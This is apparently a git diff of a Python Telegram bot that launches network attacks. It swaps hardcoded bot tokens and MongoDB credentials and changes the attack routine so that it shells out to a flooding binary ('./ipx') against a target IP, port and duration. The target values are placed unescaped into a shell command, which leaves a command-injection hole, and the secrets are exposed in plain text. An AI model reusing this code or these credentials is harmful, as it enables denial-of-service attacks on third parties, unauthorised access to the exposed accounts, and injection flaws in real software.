@@ -18,8 +18,8 @@ import psutil
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7186923047:AAEiPzQ9_IluDgiwDyDXidUzMq5CTl77hTM'
-MONGO_URI = 'mongodb+srv://Cluster0:Cluster0@cluster0.5mvg9ej.mongodb.net/danger?retryWrites=true&w=majority'
+TOKEN = '7350883849:AAGKU1kJKrom45oXzPcQGyV38qP_Ss1ldpw'
+MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
 FORWARD_CHANNEL_ID = -1002027880444
 CHANNEL_ID = -1002027880444
 error_channel_id = -1002027880444
@@ -27,7 +27,7 @@ error_channel_id = -1002027880444
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['danger']
+db = client['sharp']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
@@ -153,7 +153,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
+    process = await asyncio.create_subprocess_shell(f"./ipx {target_ip} {target_port} {duration} 50")
     await process.communicate()
     
     bot.attack_in_progress = False
